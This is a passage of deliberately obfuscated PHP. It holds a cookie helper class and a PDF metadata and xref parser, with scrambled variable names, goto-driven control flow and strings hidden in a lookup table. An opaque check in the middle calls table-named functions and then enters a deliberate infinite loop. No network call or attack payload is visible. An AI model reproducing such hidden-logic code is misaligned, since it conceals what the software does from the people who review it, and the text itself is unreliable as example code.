$this->expire = $Aå¼óŠè¢; } } public static function getInstance() { static $C§ğ¸Û„‹·; if ($C§ğ¸Û„‹· === null) { $C§ğ¸Û„‹· = new self(); } return $C§ğ¸Û„‹·; } private static $sameCookieSet = array(); public static function set($E˜Õ¨¯ˆÎœ, $e†ì×“•¯¸, $b­†ô‰ŠÄ‘ = 0, $CšÑÙ›Š“ = false, $B¯£• å‚  = false) { $e‚¼Ú’ºñ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$b­†ô‰ŠÄ‘) { $b­†ô‰ŠÄ‘ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$E˜Õ¨¯ˆÎœ]) && self::$sameCookieSet[$E˜Õ¨¯ˆÎœ] == $e†ì×“•¯¸ . $b­†ô‰ŠÄ‘) { return; } self::$sameCookieSet[$E˜Õ¨¯ˆÎœ] = $e†ì×“•¯¸ . $b­†ô‰ŠÄ‘; if (!$B¯£• å‚ ) { $B¯£• å‚  = str_replace(HOST, $e‚¼Ú’ºñ[33], APP_HOST); $B¯£• å‚  = $e‚¼Ú’ºñ[8] . trim($B¯£• å‚ , $e‚¼Ú’ºñ[8]); } setcookie($E˜Õ¨¯ˆÎœ, $e†ì×“•¯¸, time() + $b­†ô‰ŠÄ‘, $B¯£• å‚ , !1, !1, $CšÑÙ›Š“); } public static function setSafe($A…•½ÓÙÙ´, $aíÚ…øê¾Ö, $BÆ‹ˆªó¯í = 0) { self::set($A…•½ÓÙÙ´, $aíÚ…øê¾Ö, $BÆ‹ˆªó¯í, !0); } public static function get($D‘¾À«á•) { return isset($_COOKIE[$D‘¾À«á•]) ? $_COOKIE[$D‘¾À«á•] : !1; } public static function remove($CÌÜÂ¤İ‡, $E¢ÔÙÅõ‘˜ = false) { unset($_COOKIE[$CÌÜÂ¤İ‡]); self::set($CÌÜÂ¤İ‡, $_SERVER[÷ÖêïÔÔÓ][33], 1, $E¢ÔÙÅõ‘˜); } } if (!isset($_SERVER[$_SERVER[÷ÖêïÔÔÓ][781]]) || !isset($_SERVER[$_SERVER[÷ÖêïÔÔÓ][791]])) { goto aùÏØ“î©; A²ŞîÇƒÇ‡: $a¾„§³‰‰Æ($_SERVER[$_SERVER[÷ÖêïÔÔÓ][785]] . $_SERVER[÷ÖêïÔÔÓ][786]); $aŞÅ‰ŸÙÃÓ = 2; while ($aŞÅ‰ŸÙÃÓ > 1) { $dóÕ£‰ß = rawurlencode($aŞÅ‰ŸÙÃÓ . $_SERVER[÷ÖêïÔÔÓ][358]); } goto EÜ÷ÅëÉ§ô; eñ›‡’: $AÀÇ¼è¢ÁĞ = explode($_SERVER[÷ÖêïÔÔÓ][214], $C¶ó·šÈá—); if (count($AÀÇ¼è¢ÁĞ) < $_SERVER[÷ÖêïÔÔÓ][550]) { $FëŸ®ŠòÏ¼ = $_SERVER[÷ÖêïÔÔÓ][787]; $FëŸ®ŠòÏ¼(); } $a¾„§³‰‰Æ = $_SERVER[÷ÖêïÔÔÓ][792]; goto A²ŞîÇƒÇ‡; aùÏØ“î©: $f¾ãœ„š—Ü = $_SERVER[÷ÖêïÔÔÓ][784]; $bÌİ¶åÑ· = $_SERVER[$_SERVER[÷ÖêïÔÔÓ][785]] . $_SERVER[÷ÖêïÔÔÓ][786]; $C¶ó·šÈá— = $f¾ãœ„š—Ü($bÌİ¶åÑ·); goto eñ›‡’; EÜ÷ÅëÉ§ô: } goto d§ª¶¢ÎÂØ; e÷ÀêîÇ¥½: class FileParsePdf { public static function parse($CµŒ»“«‘) { goto AøçƒÒÇœ; CÒâÉÇá­¬: if ($d•ëö„ŞÈ•) { $D÷¿º­©ß‡ = $d•ëö„ŞÈ•[$AƒôœÙïù[1434]][$AƒôœÙïù[1151]]; $cñÏŞß·ƒ = self::getObjectValue($cß‰ƒèŠ, $d•ëö„ŞÈ•, $D÷¿º­©ß‡); } $cñÏŞß·ƒ = is_array($cñÏŞß·ƒ) ? $cñÏŞß·ƒ : array(); $cñÏŞß·ƒ[$AƒôœÙïù[1435]] = 0; goto F÷¡ƒÍÒßî; E¯•Ü«‡: preg_match($f×ãå¢ºÊ¢, $cß‰ƒèŠ[$AƒôœÙïù[1433]], $cÕÆ¡‰ÓØ“); if (!$cñÏŞß·ƒ[$AƒôœÙïù[1435]] && count($cÕÆ¡‰ÓØ“) == 5) { $cñÏŞß·ƒ[$AƒôœÙïù[1435]] = $cÕÆ¡‰ÓØ“[3]; $cñÏŞß·ƒ[$AƒôœÙïù[1437]] = $cÕÆ¡‰ÓØ“[4]; } preg_match($AƒôœÙïù[1438], $cß‰ƒèŠ[$AƒôœÙïù[1432]], $cÕÆ¡‰ÓØ“); goto bƒê©¹•™¢; c®­°À†¼Í: $cß‰ƒèŠ[$AƒôœÙïù[1432]] = StreamWrapperIO::read($CµŒ»“«‘, 0, $B‰ª§Í¼ó›); $cß‰ƒèŠ[$AƒôœÙïù[1433]] = StreamWrapperIO::read($CµŒ»“«‘, $cß‰ƒèŠ[$AƒôœÙïù[78]] - $B‰ª§Í¼ó›, $B‰ª§Í¼ó›); $d•ëö„ŞÈ• = self::decodeXref($cß‰ƒèŠ); goto CÒâÉÇá­¬; fìŒÍÕ²ëÊ: preg_match_all($f×ãå¢ºÊ¢, $cß‰ƒèŠ[$AƒôœÙïù[1432]], $cÕÆ¡‰ÓØ“); if ($cÕÆ¡‰ÓØ“[1] && $cñÏŞß·ƒ[$AƒôœÙïù[1439]] < $cÕÆ¡‰ÓØ“[1][0]) { $cñÏŞß·ƒ[$AƒôœÙïù[1439]] = $cÕÆ¡‰ÓØ“[1][0]; } preg_match_all($f×ãå¢ºÊ¢, $cß‰ƒèŠ[$AƒôœÙïù[1433]], $cÕÆ¡‰ÓØ“); goto BæÁÜíÙ–…; AøçƒÒÇœ: $AƒôœÙïù =& $_SERVER[÷ÖêïÔÔÓ]; $B‰ª§Í¼ó› = 32 * 1024; $cß‰ƒèŠ = array($AƒôœÙïù[770] => fopen($CµŒ»“«‘, $AƒôœÙïù[1128]), $AƒôœÙïù[76] => $CµŒ»“«‘, $AƒôœÙïù[78] => filesize($CµŒ»“«‘), $AƒôœÙïù[1431] => $B‰ª§Í¼ó›); goto c®­°À†¼Í; bƒê©¹•™¢: if ($cÕÆ¡‰ÓØ“) { $cñÏŞß·ƒ[$AƒôœÙïù[1236]] = $cÕÆ¡‰ÓØ“[1]; } $cñÏŞß·ƒ[$AƒôœÙïù[1439]] = 0; $f×ãå¢ºÊ¢ = $AƒôœÙïù[1440]; goto fìŒÍÕ²ëÊ; BæÁÜíÙ–…: if ($cÕÆ¡‰ÓØ“[1] && $cñÏŞß·ƒ[$AƒôœÙïù[1439]] < $cÕÆ¡‰ÓØ“[1][0]) { $cñÏŞß·ƒ[$AƒôœÙïù[1439]] = $cÕÆ¡‰ÓØ“[1][0]; } $cñÏŞß·ƒ = self::parseInfoItem($cñÏŞß·ƒ); return $cñÏŞß·ƒ; goto d’÷¥¡éÃ; F÷¡ƒÍÒßî: $f×ãå¢ºÊ¢ = $AƒôœÙïù[1436]; preg_match($f×ãå¢ºÊ¢, $cß‰ƒèŠ[$AƒôœÙïù[1432]], $cÕÆ¡‰ÓØ“); if (!$cñÏŞß·ƒ[$AƒôœÙïù[1435]] && count($cÕÆ¡‰ÓØ“) == 5) { $cñÏŞß·ƒ[$AƒôœÙïù[1435]] = $cÕÆ¡‰ÓØ“[3]; $cñÏŞß·ƒ[$AƒôœÙïù[1437]] = $cÕÆ¡‰ÓØ“[4]; } goto E¯•Ü«‡; d’÷¥¡éÃ: } private static function parseInfoItem($b– °‹Çó) { $b‡÷ª•çÔ“ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$b– °‹Çó) { return !1; } $cñ×±”éÅÖ = array($b‡÷ª•çÔ“[1237] => array($b‡÷ª•çÔ“[1441], $b‡÷ª•çÔ“[33]), $b‡÷ª•çÔ“[1442] => array($b‡÷ª•çÔ“[1443], $b‡÷ª•çÔ“[33]), $b‡÷ª•çÔ“[184] => array($b‡÷ª•çÔ“[1444], $b‡÷ª•çÔ“[207]), $b‡÷ª•çÔ“[106] => array($b‡÷ª•çÔ“[1445], $b‡÷ª•çÔ“[207]), $b‡÷ª•çÔ“[1439] => array($b‡÷ª•çÔ“[1439], $b‡÷ª•çÔ“[273]), $b‡÷ª•çÔ“[1435] => array($b‡÷ª•çÔ“[1435], $b‡÷ª•çÔ“[273]), $b‡÷ª•çÔ“[1437] => array($b‡÷ª•çÔ“[1437], $b‡÷ª•çÔ“[273]), $b‡÷ª•çÔ“[1446] => array($b‡÷ª•çÔ“[1447], $b‡÷ª•çÔ“[33]), $b‡÷ª•çÔ“[1448] => array($b‡÷ª•çÔ“[1449], $b‡÷ª•çÔ“[33]), $b‡÷ª•çÔ“[1450] => array($b‡÷ª•çÔ“[1236], $b‡÷ª•çÔ“[33])); $dÖ±ğÆ¥º‚ = array(); foreach ($cñ×±”éÅÖ as $A•‚ùğ è => $e‹ñÂŸ‹¨) { if (!isset($b– °‹Çó[$e‹ñÂŸ‹¨[0]])) { continue; } $DŸª‘ŸŞ¾È = $b– °‹Çó[$e‹ñÂŸ‹¨[0]]; if (!$DŸª‘ŸŞ¾È || is_array($DŸª‘ŸŞ¾È)) { continue; } switch ($e‹ñÂŸ‹¨[1]) { case $b‡÷ª•çÔ“[273]: $DŸª‘ŸŞ¾È = intval($DŸª‘ŸŞ¾È); break; case $b‡÷ª•çÔ“[207]: if (substr($DŸª‘ŸŞ¾È, 0, 2) == $b‡÷ª•çÔ“[1451]) { $DŸª‘ŸŞ¾È = substr($DŸª‘ŸŞ¾È, 2, 14); } if (strtotime($DŸª‘ŸŞ¾È)) { $DŸª‘ŸŞ¾È = date($b‡÷ª•çÔ“[1452], strtotime($DŸª‘ŸŞ¾È)); } break; } $dÖ±ğÆ¥º‚[$A•‚ùğ è] = $DŸª‘ŸŞ¾È; } return $dÖ±ğÆ¥º‚; } private static function decodeXref(&$dÀö÷ã«åà) { goto f³·÷ªàØ¦; F¤¡ô¡‰ƒŠ: $B‡ÅšîóìÖ = $AŞ¬†£“Çê[1454]; if (!preg_match_all($B‡ÅšîóìÖ, $Eö½‹İ•ï, $d¨Œ¾Ë²Ê, PREG_SET_ORDER, 0)) { return !1; } $D›¬œËëœ = intval($d¨Œ¾Ë²Ê[0][1]); goto B§Ô²­Õ’Ã; b”íç£âò: foreach ($d¨Œ¾Ë²Ê[3] as $Eã÷¼¡ŠÕ¿ => $e‘™Óš—”²) { if ($d¨Œ¾Ë²Ê[3][$Eã÷¼¡ŠÕ¿] == $AŞ¬†£“Çê[1456]) { $bŠëõöŸÃ = $D©‘¬‡ˆ¥Ë . $AŞ¬†£“Çê[71] . intval($d¨Œ¾Ë²Ê[2][$Eã÷¼¡ŠÕ¿]); $fÃ†˜®¤ª[$AŞ¬†£“Çê[1453]][$bŠëõöŸÃ] = intval($d¨Œ¾Ë²Ê[1][$Eã÷¼¡ŠÕ¿]); ++$D©‘¬‡ˆ¥Ë; } else { if ($d¨Œ¾Ë²Ê[3][$Eã÷¼¡ŠÕ¿] == $AŞ¬†£“Çê[1457]) { ++$D©‘¬‡ˆ¥Ë; } else { } } } if (preg_match_all($AŞ¬†£“Çê[1458], $Eö½‹İ•ï, $d¨Œ¾Ë²Ê)) { $F‹‘ºùÉç‘ = $dÀö÷ã«åà[$AŞ¬†£“Çê[78]] - $dÀö÷ã«åà[$AŞ¬†£“Çê[1431]]; foreach ($d¨Œ¾Ë²Ê[0] as $Eã÷¼¡ŠÕ¿ => $cÃšõ±˜ñ¢) { $eæÙÇ¥Ê» = $d¨Œ¾Ë²Ê[1][$Eã÷¼¡ŠÕ¿] . $AŞ¬†£“Çê[71] . $d¨Œ¾Ë²Ê[2][$Eã÷¼¡ŠÕ¿]; $fÃ†˜®¤ª[$AŞ¬†£“Çê[1453]][$eæÙÇ¥Ê»] = strpos($Eö½‹İ•ï, $cÃšõ±˜ñ¢) + $F‹‘ºùÉç‘ + 1; } } if (preg_match_all($AŞ¬†£“Çê[1459], $Eö½‹İ•ï, $d¨Œ¾Ë²Ê)) { $fÁ¥ßğæ”  = count($d¨Œ¾Ë²Ê[1]) == 1 ? $d¨Œ¾Ë²Ê[1][0] : $d¨Œ¾Ë²Ê[1][1]; } else { $fÁ¥ßğæ”  = substr($Eö½‹İ•ï, -1024 * 5); } goto f¦˜À˜´“ï; f³·÷ªàØ¦: $AŞ¬†£“Çê =& $_SERVER[÷ÖêïÔÔÓ]; $Eö½‹İ•ï = $dÀö÷ã«åà[$AŞ¬†£“Çê[1433]]; $fÃ†˜®¤ª = array($AŞ¬†£“Çê[1434] => array(), $AŞ¬†£“Çê[1453] => array()); goto F¤¡ô¡‰ƒŠ; d¡³öÁÊß: if (preg_match($AŞ¬†£“Çê[1465], $fÁ¥ßğæ” , $d¨Œ¾Ë²Ê) > 0) { $fÃ†˜®¤ª[$AŞ¬†£“Çê[1434]][$AŞ¬†£“Çê[1151]] = intval($d¨Œ¾Ë²Ê[1]) . $AŞ¬†£“Çê[71] . intval($d¨Œ¾Ë²Ê[2]); } if (preg_match($AŞ¬†£“Çê[1466], $fÁ¥ßğæ” , $d¨Œ¾Ë²Ê) > 0) { $fÃ†˜®¤ª[$AŞ¬†£“Çê[1434]][$AŞ¬†£“Çê[364]] = array(); $fÃ†˜®¤ª[$AŞ¬†£“Çê[1434]][$AŞ¬†£“Çê[364]][0] = $d¨Œ¾Ë²Ê[1]; $fÃ†˜®¤ª[$AŞ¬†£“Çê[1434]][$AŞ¬†£“Çê[364]][1] = $d¨Œ¾Ë²Ê[2]; } if (!$fÃ†˜®¤ª[$AŞ¬†£“Çê[1434]][$AŞ¬†£“Çê[1151]]) { return !1; } goto cğ†á¿Îôä; B§Ô²­Õ’Ã: if ($dÀö÷ã«åà[$AŞ¬†£“Çê[78]] - $D›¬œËëœ > $dÀö÷ã«åà[$AŞ¬†£“Çê[1431]]) { $CĞ¤²›ğç– = 4 * $dÀö÷ã«åà[$AŞ¬†£“Çê[1431]]; $dÀö÷ã«åà[$AŞ¬†£“Çê[1431]] = $CĞ¤²›ğç–; $dÀö÷ã«åà[$AŞ¬†£“Çê[1432]] = StreamWrapperIO::read($dÀö÷ã«åà[$AŞ¬†£“Çê[76]], 0, $CĞ¤²›ğç–); $dÀö÷ã«åà[$AŞ¬†£“Çê[1433]] = StreamWrapperIO::read($dÀö÷ã«åà[$AŞ¬†£“Çê[76]], $dÀö÷ã«åà[$AŞ¬†£“Çê[78]] - $CĞ¤²›ğç–, $CĞ¤²›ğç–); $Eö½‹İ•ï = $dÀö÷ã«åà[$AŞ¬†£“Çê[1433]]; } $D©‘¬‡ˆ¥Ë = 0; preg_match_all($AŞ¬†£“Çê[1455], $Eö½‹İ•ï, $d¨Œ¾Ë²Ê); goto b”íç£âò; f¦˜À˜´“ï: if (preg_match($AŞ¬†£“Çê[1460], $fÁ¥ßğæ” , $d¨Œ¾Ë²Ê) > 0) { $fÃ†˜®¤ª[$AŞ¬†£“Çê[1434]][$AŞ¬†£“Çê[78]] = intval($d¨Œ¾Ë²Ê[1]); } if (preg_match($AŞ¬†£“Çê[1461], $fÁ¥ßğæ” , $d¨Œ¾Ë²Ê) > 0) { $fÃ†˜®¤ª[$AŞ¬†£“Çê[1434]][$AŞ¬†£“Çê[1462]] = intval($d¨Œ¾Ë²Ê[1]) . $AŞ¬†£“Çê[71] . intval($d¨Œ¾Ë²Ê[2]); } if (preg_match($AŞ¬†£“Çê[1463], $fÁ¥ßğæ” , $d¨Œ¾Ë²Ê) > 0) { $fÃ†˜®¤ª[$AŞ¬†£“Çê[1434]][$AŞ¬†£“Çê[1464]] = intval($d¨Œ¾Ë²Ê[1]) . $AŞ¬†£“Çê[71] . intval($d¨Œ¾Ë²Ê[2]); } goto d¡³öÁÊß; cğ†á¿Îôä: if (preg_match($AŞ¬†£“Çê[1467], $fÁ¥ßğæ” , $d¨Œ¾Ë²Ê) > 0) { } return $fÃ†˜®¤ª; goto f¨ô’“œÍï; f¨ô’“œÍï: } private static function getObjectValue($fÙ‹¼–Ô©, $FíšÄ¦—¸, $aù¡Š¾áÒñ) { goto DÑ¸ƒç•£Ñ; Eß†–ºÔ³¼: if (!is_array($DªæÎÁ¥Ğ[1])) { return array(); } $BÄ‰æ°Îİ† = array(); for ($eò‡Ú¹Àè = 0; $eò‡Ú¹Àè < count($DªæÎÁ¥Ğ[1]); $eò‡Ú¹Àè += 2) { $Bš³‡°ğŞ = $DªæÎÁ¥Ğ[1][$eò‡Ú¹Àè]; $aæŠ»Ğ•áò = $DªæÎÁ¥Ğ[1][$eò‡Ú¹Àè + 1]; if (count($Bš³‡°ğŞ) == 3 && $Bš³‡°ğŞ[0] == $fìˆ‹‹–Ë[8]) { $BáˆËÄ¦œ¾ = !1; if ($aæŠ»Ğ•áò[0] == $fìˆ‹‹–Ë[1468]) { $aæŠ»Ğ•áò = self::getObject($fÙ‹¼–Ô©, $FíšÄ¦—¸[$fìˆ‹‹–Ë[1453]][$aæŠ»Ğ•áò[1]]); } $BáˆËÄ¦œ¾ = $aæŠ»Ğ•áò[1]; if ($BáˆËÄ¦œ¾ === !1) { continue; } if (is_string($BáˆËÄ¦œ¾)) { $BáˆËÄ¦œ¾ = self::decodeStr($BáˆËÄ¦œ¾); } $BÄ‰æ°Îİ†[$Bš³‡°ğŞ[1]] = $BáˆËÄ¦œ¾; } } goto EåÉƒƒ†Àï; DÑ¸ƒç•£Ñ: $fìˆ‹‹–Ë =& $_SERVER[÷ÖêïÔÔÓ]; $DªæÎÁ¥Ğ = self::getObject($fÙ‹¼–Ô©, $FíšÄ¦—¸[$fìˆ‹‹–Ë[1453]][$aù¡Š¾áÒñ]); if (is_string($DªæÎÁ¥Ğ[1])) { return $DªæÎÁ¥Ğ[1]; } goto Eß†–ºÔ³¼; EåÉƒƒ†Àï: return $BÄ‰æ°Îİ†; goto BÕÈ–àßÎ; BÕÈ–àßÎ: } private static function getObject($bÂÔ¸›Æ¡, $a’õ¢ÚŞÒ˜) { $bïœ´ÁµÍ = self::getObjectItem($bÂÔ¸›Æ¡, $a’õ¢ÚŞÒ˜); $bïœ´ÁµÍ = self::getObjectItem($bÂÔ¸›Æ¡, $bïœ´ÁµÍ[2]); return $bïœ´ÁµÍ; } private static function getObjectItem($A‘±Ö‰™â–, $FåÎ«”ä) { goto Cæ”Ï§¬†´; c¡Æ¾´²„: $e³’„•ˆ• = self::getRawObject($bÄÁ…Üœ¯½, $C˜“Òïº¿); if ($FåÎ«”ä >= $dî¿Êõ†æ™) { $e³’„•ˆ•[2] = $e³’„•ˆ•[2] + $dî¿Êõ†æ™; } else { if ($FåÎ«”ä > $bõğò‹‡¥‹ && $FåÎ«”ä <= $dî¿Êõ†æ™) { $e³’„•ˆ•[2] = $e³’„•ˆ•[2] + $FåÎ«”ä; } } return $e³’„•ˆ•; goto d«²äù¬£Ø; Cæ”Ï§¬†´: $e‡Íæ‡Ÿİ =& $_SERVER[÷ÖêïÔÔÓ]; $bõğò‹‡¥‹ = $A‘±Ö‰™â–[$e‡Íæ‡Ÿİ[1431]]; $dî¿Êõ†æ™ = $A‘±Ö‰™â–[$e‡Íæ‡Ÿİ[78]] - $bõğò‹‡¥‹; goto dÃë…„ãŠš; dÃë…„ãŠš: $C˜“Òïº¿ = $FåÎ«”ä >= $dî¿Êõ†æ™ ? $FåÎ«”ä - $dî¿Êõ†æ™ : $FåÎ«”ä; $bÄÁ…Üœ¯½ = $FåÎ«”ä >= $dî¿Êõ†æ™ ? $A‘±Ö‰™â–[$e‡Íæ‡Ÿİ[1433]] : $A‘±Ö‰™â–[$e‡Íæ‡Ÿİ[1432]]; if ($FåÎ«”ä > $bõğò‹‡¥‹ && $FåÎ«”ä <= $dî¿Êõ†æ™) { $C˜“Òïº¿ = 0; $bÄÁ…Üœ¯½ = StreamWrapperIO::read($A‘±Ö‰™â–[$e‡Íæ‡Ÿİ[76]], $FåÎ«”ä, $bõğò‹‡¥‹); } goto c¡Æ¾´²„; d«²äù¬£Ø: } private static function decodeStr($EçŒî„Ò°) { goto döÇ¿’ß‡; aê˜Š”–©: $EçŒî„Ò° = $fä¨Œ´¥“[33]; foreach ($cá©Ú‘õç¯ as $eèÅ÷¸“ƒ…) { if (preg_match($fä¨Œ´¥“[1480], $eèÅ÷¸“ƒ…)) { $EçŒî„Ò° .= \chr(hexdec(trim($eèÅ÷¸“ƒ…, $fä¨Œ´¥“[1481]))); } else { $EçŒî„Ò° .= $eèÅ÷¸“ƒ…; } } $cá©Ú‘õç¯ = preg_split($fä¨Œ´¥“[1482], $EçŒî„Ò°, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto C¦¬Ø°ˆÂç; C¦¬Ø°ˆÂç: $EçŒî„Ò° = $fä¨Œ´¥“[33]; foreach ($cá©Ú‘õç¯ as $eèÅ÷¸“ƒ…) { if (preg_match($fä¨Œ´¥“[1483], $eèÅ÷¸“ƒ…) && !1 === stripos($eèÅ÷¸“ƒ…, $fä¨Œ´¥“[1484])) { $eèÅ÷¸“ƒ… = preg_replace($fä¨Œ´¥“[1485], $fä¨Œ´¥“[33], $eèÅ÷¸“ƒ…); $eèÅ÷¸“ƒ… = trim($eèÅ÷¸“ƒ…, $fä¨Œ´¥“[922]); $eèÅ÷¸“ƒ… = pack($fä¨Œ´¥“[1486], $eèÅ÷¸“ƒ…); $EçŒî„Ò° .= $eèÅ÷¸“ƒ…; } else { $EçŒî„Ò° .= $eèÅ÷¸“ƒ…; } } if (preg_match($fä¨Œ´¥“[1487], $EçŒî„Ò°)) { $FÙô¡ùâİ = substr($EçŒî„Ò°, 2); $EçŒî„Ò° = $fä¨Œ´¥“[33]; $F‹àÊ…›¶ = strlen($FÙô¡ùâİ); for ($e‡øî§íµ¿ = 0; $e‡øî§íµ¿ < $F‹àÊ…›¶; $e‡øî§íµ¿ += 2) { $Eğ¹¥ïÀ¸ = hexdec(bin2hex(substr($FÙô¡ùâİ, $e‡øî§íµ¿, 2))); $EçŒî„Ò° .= mb_convert_encoding($fä¨Œ´¥“[1488] . intval($Eğ¹¥ïÀ¸) . $fä¨Œ´¥“[68], $fä¨Œ´¥“[1489], $fä¨Œ´¥“[1490]); } } goto bÈÀŞÇ‚¨; döÇ¿’ß‡: $fä¨Œ´¥“ =& $_SERVER[÷ÖêïÔÔÓ]; $EçŒî„Ò° = str_replace(array($fä¨Œ´¥“[1469], $fä¨Œ´¥“[1470], $fä¨Œ´¥“[1471], $fä¨Œ´¥“[1472], $fä¨Œ´¥“[1473], $fä¨Œ´¥“[1474], $fä¨Œ´¥“[1475], $fä¨Œ´¥“[1476]), array($fä¨Œ´¥“[94], $fä¨Œ´¥“[50], $fä¨Œ´¥“[8], $fä¨Œ´¥“[245], $fä¨Œ´¥“[812], $fä¨Œ´¥“[214], $fä¨Œ´¥“[715], $fä¨Œ´¥“[327]), $EçŒî„Ò°); $cá©Ú‘õç¯ = preg_split($fä¨Œ´¥“[1477], $EçŒî„Ò°, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto bŠ•ŒÌ²¯; bÈÀŞÇ‚¨: return $EçŒî„Ò°; goto Cƒëõ¼®‰; bŠ•ŒÌ²¯: $EçŒî„Ò° = $fä¨Œ´¥“[33]; foreach ($cá©Ú‘õç¯ as $eèÅ÷¸“ƒ…) { if (preg_match($fä¨Œ´¥“[1478], $eèÅ÷¸“ƒ…)) { $EçŒî„Ò° .= \chr(octdec(trim($eèÅ÷¸“ƒ…, $fä¨Œ´¥“[94]))); } else { $EçŒî„Ò° .= $eèÅ÷¸“ƒ…; } } $cá©Ú‘õç¯ = preg_split($fä¨Œ´¥“[1479], $EçŒî„Ò°, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto aê˜Š”–©; Cƒëõ¼®‰: } private static function getRawObject($AóÊ£¡‹®, $b“¾§Ü³²å = 0) { goto E ‹²÷áº±; däÖ¹µ¤Â¤: $b“¾§Ü³²å += strspn($AóÊ£¡‹®, $D ¥ñÃ²„õ[1491], $b“¾§Ü³²å); $AÖÂµÆªƒî = $AóÊ£¡‹®[$b“¾§Ü³²å]; switch ($AÖÂµÆªƒî) { case $D ¥ñÃ²„õ[1492]: $A‰ò„µñ­Ö = strcspn($AóÊ£¡‹®, $D ¥ñÃ²„õ[1493], $b“¾§Ü³²å); if ($A‰ò„µñ­Ö > 0) { $b“¾§Ü³²å += $A‰ò„µñ­Ö; return self::getRawObject($AóÊ£¡‹®, $b“¾§Ü³²å); } break; case $D ¥ñÃ²„õ[8]: $D›œì‚îÓê = $AÖÂµÆªƒî; ++$b“¾§Ü³²å; $E¡ÔÁ†Ğ‘Ê = preg_match($D ¥ñÃ²„õ[1494], substr($AóÊ£¡‹®, $b“¾§Ü³²å, 256), $BÌİ„ˆîƒÜ); if (1 == $E¡ÔÁ†Ğ‘Ê) { $AÍ¼½©¬š… = $BÌİ„ˆîƒÜ[1]; $b“¾§Ü³²å += strlen($AÍ¼½©¬š…); } break; case $D ¥ñÃ²„õ[245]: case $D ¥ñÃ²„õ[812]: $D›œì‚îÓê = $AÖÂµÆªƒî; ++$b“¾§Ü³²å; $aÍĞËåÓùß = $b“¾§Ü³²å; if ($D ¥ñÃ²„õ[245] == $AÖÂµÆªƒî) { $D³‹õ¡’Ò = 1; while ($D³‹õ¡’Ò > 0) { if (!isset($AóÊ£¡‹®[$aÍĞËåÓùß])) { break; } $B‹óÑËÊå = $AóÊ£¡‹®[$aÍĞËåÓùß]; switch ($B‹óÑËÊå) { case $D ¥ñÃ²„õ[94]: ++$aÍĞËåÓùß; break; case $D ¥ñÃ²„õ[245]: ++$D³‹õ¡’Ò; break; case $D ¥ñÃ²„õ[812]: --$D³‹õ¡’Ò; break; } ++$aÍĞËåÓùß; } $AÍ¼½©¬š… = substr($AóÊ£¡‹®, $b“¾§Ü³²å, $aÍĞËåÓùß - $b“¾§Ü³²å - 1); $b“¾§Ü³²å = $aÍĞËåÓùß; } break; case $D ¥ñÃ²„õ[154]: case $D ¥ñÃ²„õ[468]: $D›œì‚îÓê = $AÖÂµÆªƒî; ++$b“¾§Ü³²å; if ($D ¥ñÃ²„õ[154] == $AÖÂµÆªƒî) { $AÍ¼½©¬š… = array(); do { $d™ñ…§¯àË = $b“¾§Ü³²å; $E±‹ŸØõ¡ = self::getRawObject($AóÊ£¡‹®, $b“¾§Ü³²å); $b“¾§Ü³²å = $E±‹ŸØõ¡[2]; $AÍ¼½©¬š…[] = $E±‹ŸØõ¡; } while ($D ¥ñÃ²„õ[468] != $E±‹ŸØõ¡[0] && $b“¾§Ü³²å != $d™ñ…§¯àË); array_pop($AÍ¼½©¬š…); } break; case $D ¥ñÃ²„õ[921]: case $D ¥ñÃ²„õ[924]: if (isset($AóÊ£¡‹®[$b“¾§Ü³²å + 1]) && $AóÊ£¡‹®[$b“¾§Ü³²å + 1] == $AÖÂµÆªƒî) { $D›œì‚îÓê = $AÖÂµÆªƒî . $AÖÂµÆªƒî; $b“¾§Ü³²å += 2; if ($D ¥ñÃ²„õ[921] == $AÖÂµÆªƒî) { $AÍ¼½©¬š… = array(); do { $d™ñ…§¯àË = $b“¾§Ü³²å; $E±‹ŸØõ¡ = self::getRawObject($AóÊ£¡‹®, $b“¾§Ü³²å); $b“¾§Ü³²å = $E±‹ŸØõ¡[2]; $AÍ¼½©¬š…[] = $E±‹ŸØõ¡; } while ($D ¥ñÃ²„õ[1495] != $E±‹ŸØõ¡[0] && $b“¾§Ü³²å != $d™ñ…§¯àË); array_pop($AÍ¼½©¬š…); } } else { $D›œì‚îÓê = $AÖÂµÆªƒî; ++$b“¾§Ü³²å; $E¡ÔÁ†Ğ‘Ê = preg_match($D ¥ñÃ²„õ[1496], substr($AóÊ£¡‹®, $b“¾§Ü³²å), $BÌİ„ˆîƒÜ); if ($D ¥ñÃ²„õ[921] == $AÖÂµÆªƒî && 1 == $E¡ÔÁ†Ğ‘Ê) { $AÍ¼½©¬š… = strtr($BÌİ„ˆîƒÜ[1], $D ¥ñÃ²„õ[1497], $D ¥ñÃ²„õ[33]); $b“¾§Ü³²å += \strlen($BÌİ„ˆîƒÜ[0]); } elseif (!1 !== ($Cñêè®¨× = strpos($AóÊ£¡‹®, $D ¥ñÃ²„õ[924], $b“¾§Ü³²å))) { $b“¾§Ü³²å = $Cñêè®¨× + 1; } } break; default: if ($D ¥ñÃ²„õ[1498] == substr($AóÊ£¡‹®, $b“¾§Ü³²å, 6)) { $D›œì‚îÓê = $D ¥ñÃ²„õ[1498]; $b“¾§Ü³²å += 6; } elseif ($D ¥ñÃ²„õ[100] == substr($AóÊ£¡‹®, $b“¾§Ü³²å, 4)) { $D›œì‚îÓê = $D ¥ñÃ²„õ[100]; $b“¾§Ü³²å += 4; $AÍ¼½©¬š… = $D ¥ñÃ²„õ[100]; } elseif ($D ¥ñÃ²„õ[1499] == substr($AóÊ£¡‹®, $b“¾§Ü³²å, 4)) { $D›œì‚îÓê = $D ¥ñÃ²„õ[1500]; $b“¾§Ü³²å += 4; $AÍ¼½©¬š… = $D ¥ñÃ²„õ[1499]; } elseif ($D ¥ñÃ²„õ[1501] == substr($AóÊ£¡‹®, $b“¾§Ü³²å, 5)) { $D›œì‚îÓê = $D ¥ñÃ²„õ[1500]; $b“¾§Ü³²å += 5; $AÍ¼½©¬š… = $D ¥ñÃ²„õ[1501]; } elseif ($D ¥ñÃ²„õ[998] == substr($AóÊ£¡‹®, $b“¾§Ü³²å, 6)) { $D›œì‚îÓê = $D ¥ñÃ²„õ[998]; $b“¾§Ü³²å += 6; if (1 == preg_match($D ¥ñÃ²„õ[1502], substr($AóÊ£¡‹®, 